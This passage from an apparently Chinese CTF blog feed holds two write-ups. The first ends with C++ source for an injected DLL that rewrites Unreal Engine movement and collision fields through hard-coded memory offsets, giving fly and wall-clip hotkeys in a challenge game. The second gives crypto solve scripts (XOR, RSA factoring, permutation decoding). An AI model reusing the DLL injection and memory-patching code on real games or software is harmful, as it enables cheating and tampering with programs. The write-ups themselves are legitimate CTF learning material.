class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_MOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCapsuleComponent* <span class="title">GetCapsuleComponent</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCapsuleComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CAPSULE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLand = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunch = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCH);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Flying;</span><br><span class="line">        <span class="keyword">if</span> (giveBoost) &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (giveBoost &amp;&amp; lastUpdateVel.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVel.Z = <span class="number">400.f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyCollisionState</span><span class="params">(UCapsuleComponent* capsule, <span class="type">bool</span> noCollision)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!capsule) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* primitive = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(capsule);</span><br><span class="line">    <span class="keyword">auto</span>&amp; collisionEnabled = *<span class="built_in">reinterpret_cast</span>&lt;ECollisionEnabled*&gt;(</span><br><span class="line">        primitive + OFFSET_UPRIMITIVE_BODYINSTANCE + OFFSET_FBODYINSTANCE_COLLISIONENABLED);</span><br><span class="line"></span><br><span class="line">    collisionEnabled = noCollision ? ECollisionEnabled::NoCollision</span><br><span class="line">        : ECollisionEnabled::QueryAndPhysics;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ShouldFly</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_userFly.<span class="built_in">load</span>() || g_autoFlyFromCollision.<span class="built_in">load</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            g_userFly = !g_userFly.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F5) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement || !capsule) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> newState = !g_noCollision.<span class="built_in">load</span>();</span><br><span class="line">            g_noCollision = newState;</span><br><span class="line">            g_autoFlyFromCollision = newState;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ApplyCollisionState</span>(capsule, newState);</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；</span></span><br><span class="line"><span class="comment">            如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement/ Capsule，</span></span><br><span class="line"><span class="comment">            能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShouldFly</span>() || g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character)) &#123;</span><br><span class="line">                            <span class="built_in">SustainFly</span>(movement, g_userFly.<span class="built_in">load</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character); g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">                            <span class="built_in">ApplyCollisionState</span>(capsule, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式\nF5 切换穿墙模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flag：TSCTF-J{u0real_or_R1AL?!</p><p>还有一段flag找不到</p><p>只能看wp了</p><p>看了题解是藏在前面了_and_here}</p><p>TSCTF-J{u0real_or_R1AL?!_and_here}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UE4逆向初探-OverWatch&quot;&gt;&lt;a href=&quot;#UE4逆向初探-OverWatch&quot; class=&quot;headerlink&quot; title=&quot;UE4逆向初探-OverWatch&quot;&gt;&lt;/a&gt;UE4逆向初探-OverWatch&lt;/h1&gt;&lt;p&gt;可以看这个&lt;a hr</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>TSCTF-J 2025 wp</title>
    <link href="http://matriy330.github.io/ae56c8ab/"/>
    <id>http://matriy330.github.io/ae56c8ab/</id>
    <published>2025-10-13T15:00:00.000Z</published>
    <updated>2025-10-14T15:06:38.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TSCTF-J-2025-wp"><a href="#TSCTF-J-2025-wp" class="headerlink" title="TSCTF-J 2025 wp"></a>TSCTF-J 2025 wp</h1><p>本次TSCTF-J，共解出27道题，逆向差两道AK，主RE赛道 先做的题后补的wp，因此写的可能有点屎，wp后面会在博客更新完善[RE部分]</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013095822927.png" alt="image-20251013095822927"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93</span><br><span class="line">KEY2 ^ KEY1 = b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83</span><br><span class="line">KEY2 ^ KEY3 = 11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f</span><br><span class="line">FLAG ^ KEY1 ^ KEY2 ^ KEY3 = e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121</span><br></pre></td></tr></table></figure><p>F ^ K1 ^ K2 ^ K3 &#x3D; X</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">K1 = <span class="built_in">int</span>(<span class="string">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K1 = <span class="built_in">int</span>(<span class="string">&#x27;b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K3 = <span class="built_in">int</span>(<span class="string">&#x27;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">F_xor_all = <span class="built_in">int</span>(<span class="string">&#x27;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">K2 = K2_xor_K1 ^ K1</span><br><span class="line">K3 = K2 ^ K2_xor_K3</span><br><span class="line">F = F_xor_all ^ K1 ^ K2 ^ K3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag_bytes = F.to_bytes((F.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_bytes = flag_bytes.rjust(<span class="number">48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">flag = base64.b64decode(flag_bytes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{I_like_Crypto}</p><h3 id="p-q"><a href="#p-q" class="headerlink" title="p&#x3D;~q"></a>p&#x3D;~q</h3><p>可以利用 p 和 q 之间的关系来分解 n。具体来说，p 和 q 是通过将随机生成的比特串取反后生成的，因此存在数学关系。通过这种关系，我们可以将 n 表示为关于变量 C 的二次方程，并求解 C 从而得到 p 和 q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class="line">c = <span class="number">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">2</span>**<span class="number">1023</span></span><br><span class="line">D = <span class="number">9</span> * A * A - <span class="number">4</span> * n</span><br><span class="line">root = math.isqrt(D)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> root * root == D:</span><br><span class="line">    C1 = (A - root) // <span class="number">2</span></span><br><span class="line">    p1 = A + C1</span><br><span class="line">    q1 = <span class="number">2</span> * A - C1</span><br><span class="line">    <span class="keyword">if</span> p1 * q1 == n:</span><br><span class="line">        p, q = p1, q1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        C2 = (A + root) // <span class="number">2</span></span><br><span class="line">        p2 = A + C2</span><br><span class="line">        q2 = <span class="number">2</span> * A - C2</span><br><span class="line">        <span class="keyword">if</span> p2 * q2 == n:</span><br><span class="line">            p, q = p2, q2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法分解 n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;D 不是完全平方数&quot;</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{The_easiest_RSA_key!}</p><h3 id="Cantor’s-gifts"><a href="#Cantor’s-gifts" class="headerlink" title="Cantor’s gifts"></a>Cantor’s gifts</h3><p> 排列编码逆运算题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"></span><br><span class="line">X = <span class="number">2498752981111460725490082182453813672840574</span></span><br><span class="line">now_message = <span class="string">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(now_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) turn X into Lehmer digits</span></span><br><span class="line">a = []</span><br><span class="line">rem = X</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    f = factorial(n - i - <span class="number">1</span>)</span><br><span class="line">    a_i = rem // f</span><br><span class="line">    a.append(a_i)</span><br><span class="line">    rem = rem % f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) Lehmer -&gt; permutation (values 1..n)</span></span><br><span class="line">available = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>))</span><br><span class="line">reflection = []</span><br><span class="line"><span class="keyword">for</span> a_i <span class="keyword">in</span> a:</span><br><span class="line">    reflection.append(available.pop(a_i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) undo permutation: now_message[k] = message[reflection[k]-1]</span></span><br><span class="line">msg = [<span class="literal">None</span>] * n</span><br><span class="line"><span class="keyword">for</span> k, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(reflection):</span><br><span class="line">    msg[r-<span class="number">1</span>] = now_message[k:k+<span class="number">1</span>]  <span class="comment"># single byte</span></span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message =&quot;</span>, message.decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, <span class="string">b&quot;TSCTF-J&#123;&quot;</span> + message + <span class="string">b&quot;&#125;&quot;</span>.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013100932768.png" alt="image-20251013100932768"></p><h3 id="野狐禅"><a href="#野狐禅" class="headerlink" title="野狐禅"></a>野狐禅</h3><p>题目给的 Paillier 密文里写入随机数是用 LCG 生成的，而且原始 LCG 输出值也附在文件里；利用这些值，可以把 Paillier 的随机掩码去掉，直接还原出 150 个明文序列项 y。</p><p>y 实际上是一个线性递推序列，前 75 项就是 flag 按三进制拆分后的系数，后 75 项是用这些系数递推出来的结果。把递推方程在模一个大素数下写成线性方程组，就可以通过高斯消元解出 75 个未知系数。</p><p>得到的 75 个系数就是 flag 的三进制数字。把它们按照低位在前的顺序拼回去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 